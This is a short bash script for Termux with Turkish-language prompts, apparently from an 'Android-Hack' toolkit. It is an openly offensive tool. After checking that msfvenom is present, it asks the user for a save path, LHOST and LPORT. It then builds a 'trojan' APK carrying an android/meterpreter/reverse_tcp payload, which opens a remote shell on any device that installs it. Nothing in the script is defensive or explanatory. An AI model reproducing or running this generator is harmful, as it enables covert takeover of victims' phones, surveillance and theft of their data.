#!/bin/bash
##Author=UmuT_KaRa
clear
B="\e[0m"
K="\e[31m"
Y="\e[32m"
S="\e[33m"
M="\e[34m"
C="\e[36m"
kontrol () {
if [[ -a /data/data/com.termux/files/usr/bin/msfvenom ]];then
	echo
	trojan
else
	echo
	echo
	echo
	printf "$K[$K!$K]$B LÜTFEN KURULUM YAPINIZ $K!!!"
	sleep 4
	echo
	echo
	echo
	cd ..
	bash Android-Hack.sh
fi
}

trojan () {
clear
########## TROJAN APK OLUŞTUR ##########
echo
echo
echo
printf "
$YÖRNEK >$B /sdcard/trojan"
echo
echo
echo
read -p $'\e[32mAPK\'NIN KAYDEDİLECEĞİ KONUM VE ADINI GİRİNİZ \e[31m────►  \e[0m' konum
echo
bash myip.sh
echo
read -p $'\e[32mLHOST GİRİNİZ \e[31m────►  \e[0m' lhost
echo
echo
echo
printf "$Y ÖRNEK >$B 4444"
echo
echo
echo
read -p $'\e[32mLPORT GİRİNİZ \e[31m────►  \e[0m' lport
echo
echo
echo
printf "[$Y*$B]$Y TROJAN APK OLUŞTURULUYOR.."
echo
echo
echo
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $konum.apk
}
kontrol
